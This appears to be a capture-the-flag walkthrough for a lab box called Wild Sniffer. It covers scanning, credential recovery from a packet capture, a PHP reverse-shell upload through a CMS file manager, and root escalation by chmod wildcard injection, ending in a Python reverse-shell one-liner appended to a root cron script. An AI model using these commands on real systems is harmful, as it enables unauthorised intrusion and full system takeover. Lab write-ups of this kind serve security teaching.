# Exploitation Guide for Wild Sniffer

## Enumeration

We start the enumeration process with a simple Nmap scan:
```
nmap 13.72.119.96

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-01 12:28 IST
Nmap scan report for sniffer.com (13.72.119.96)
Host is up (0.28s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
```
And now a Full port Nmap scan:
```
nmap -p- 13.72.119.96

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-01 12:29 IST
Nmap scan report for sniffer.com (13.72.119.96)
Host is up (0.28s latency).
Not shown: 65524 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
21212/tcp open     unknown
```
We find port 80 is open and visit it in our browser as a first step. On the page we find apache default home page.
So we move towards the next port

```

```


Port 21212 is still unknown so we start a version scan:
```
nmap -sV -p21212 13.72.119.96

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-01 13:09 IST
Nmap scan report for sniffer.com (13.72.119.96)
Host is up (0.28s latency).

PORT      STATE SERVICE VERSION
21212/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```
Visiting the FTP from browser
```
ftp://13.72.119.96:21212/
```
We find two files
```
Index of ftp://13.72.119.96:21212/
Up to higher level directory
Name 	                    Size 	        Last Modified
File:intern-roles.txt      1 KB       01/10/20 	11:51:00 IST
File:note.txt              1 KB 	    01/10/20 	11:51:00 IST
```
Reading note.txt we get a clue about subdomains and some network monitoring tool
```
Hey dave, 
I wont be available for the next 2 days. Please inform the new interns about their roles and assigned work.
Check the file i've uploaded for intern names and roles. They have been working on some web based networking monitoring tool for fun. Please make sure you take down any subdomains they might have created for their tool.
Regards,
Tom
```
Reading intern-roles.txt we get usernames and domain name
```
sentinal@sniffer.com : Firewall Manager
dave@snifer.com : System Admin
zorba@sniffer.com : CMS Manager
tom@sniffer.com : Network Manager
goku@sniffer.com : Developer
```
Adding sniffer.com in /etc/hosts
```
13.72.119.96    sniffer.com 
```
Visitng sniffer.com we come to know it is running cmsms 2.2.5 that has Authenticated RCE.

To find more subdomains we start a subdomain bruteforce scan and get a new subdomain.
```
./gobuster vhost -u http://sniffer.com -w /opt/subdomains.lst

Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     sniffer.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /opt/subdomains.lst
===============================================================
2020/10/01 12:23:05 Starting gobuster
===============================================================
Found: monitor.sniffer.com
===============================================================
2020/10/01 12:23:10 Finished
===============================================================
```
Adding another subdomain into /etc/hosts
```
13.72.119.96    sniffer.com monitor.sniffer.com
```
Visiting monitor.sniffer.com we recall the note.txt we found earlier, in which it was mentioned that interns were developing some network monitoring tools.
So we start the directory bruteforce scan.
```
kunal@Kunal:/opt$ ./gobuster dir -u http://monitor.sniffer.com -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://monitor.sniffer.com
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/01 13:23:23 Starting gobuster
===============================================================
/files (Status: 200)
Progress: 284 / 220561 (0.13%)
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/01 13:23:32 Finished
===============================================================
```
We find a hidden directory /files.

Vsiting /files we find there are four network monitoring tools installed.
```
1) Get Date
2) Arp Poisoning
3) DNS Spoof
4) Man in the middle 
```
Selecting Option 1, we get current date

Selecting Option 2, arpspoof runs but gets blocked by firewall

Selecting Option 3, dnsspoof runs but gets blocked by firewall

Selecting Option 4, MITM attack starts and we get a capture.pcap file

```
Wireshark
```
Opening capture.pcap file in wireshark, doing Follow --> Stream on Packet number 10 we get
```
GET /statuses/replies.xml HTTP/1.1
User-Agent: SentinalNetwork/920
Cookie: _twitter_sess=Jatti_Reje_23ad2lkIiVmZGQ2ODc5MTMwMWFhOTFiMWExZDViZmQwMGEz%250AOWNkMyIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGsdsdo6Rmxhc2g6OkasasasSGFzaHsABjoKQHVzZWR7AA%253D%253D--ea12e7asasas02cd7e3f972c2b4414a97f657
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Authorization: Basic Z29rdTpkcmFnb25iYWxsc3VwZXI=
Connection: keep-alive
Host: twitter.com
```
Using base64 decoding to decode Authoization Basic
```
echo -n Z29rdTpkcmFnb25iYWxsc3VwZXI= |base64 -d

goku:dragonballsuper
```

## Exploitation

We can use those creds to login into sniffer.com 
```
http://sniffer.com/admin/login.php
```
After trying the password we get invalid credentials.

So Recalling the intern-roles.txt file earlier we got from the ftp we get a username list.

After trying many combinations we  get a valid combo
```
tom:dragonballsuper
```
After login, select 'Content -> File Manager' from the left

Here we can try to upload our php reverse shell, but as it would block php files by default, we would rename our file to rev.txt and upload.

After it gets uploaded, we would select our file "rev.txt" and click on copy and set new Target File name: as rev.php.

Execute rev.php and get a Reverse Shell


## User Escalation

Looking at the /etc/crontab we find there are few cron tasks running every minute by user root
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /opt/task.sh
* * * * * root /home/dev/sentinal.sh
```
Checking /home/dev/sentinal.sh we find nothing interesting
``` 
wall \'The harder you work the harder it is to surrender\' 
```
Checking /opt/task.sh we find it is using wildcard chmod 744 * to change file permission of all files under /home/dev
```
cd /home/dev/ && chmod 744 *
```
Looking at file permission, user www-data has only read rights on both the files

As /opt/task.sh is using wildcard * to change file permissions on all files it is vulnerable to wildcard injection

Reading manual for chmod we come to know it accepts argument as --reference=RFILE
```
man chmod 
```
```
 --reference=RFILE
              use RFILE's mode instead of MODE values
```
We can use this "--reference=RFILE" to our advantage.

Create any file with 777 permission and give reference to that file

```
www-data@wildsniffer:/home/dev# ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:39 .
drwxr-xr-x 5 root     root     4096 Sep 30 18:38 ..
-rwxr--r-- 1 root     root       60 Sep 30 18:43 sentinal.sh

www-data@wildsniffer:/home/dev# echo "" > whatever
www-data@wildsniffer:/home/dev# chmod 777 whatever

www-data@wildsniffer:/home/dev# echo "" > --reference=whatever

www-data@wildsniffer:/home/dev# ls -la
total 20
-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
-rwxr--r-- 1 root     root       60 Sep 30 18:44  sentinal.sh

www-data@wildsniffer:/home/dev# ls -la
total 20
-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
-rwxrwxrwx 1 root     root       60 Sep 30 18:46  sentinal.sh
```
So at backend side the command that would be executed is
```
chmod 744 * --reference=whatever
```
And as file whatever has permission 777 it would take 777 as reference for all files
```
www-data@wildsniffer:/home/dev# ls -la
total 20
-rw-r--r-- 1 www-data www-data    1 Sep 30 18:44 '--reference=whatever'
drwxr-xr-x 2 www-data www-data 4096 Sep 30 18:44  .
drwxr-xr-x 5 root     root     4096 Sep 30 18:38  ..
-rwxrwxrwx 1 www-data www-data    1 Sep 30 18:43  whatever
-rwxrwxrwx 1 root     root       60 Sep 30 18:46  sentinal.sh
```
Add reverse shell in sentinal.sh file to get a root shell when next cron is executed
```
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> sentinal.sh
```

```
root@wildsniffer:~# whoami
root
root@wildsniffer:~# ls
proof.txt
```
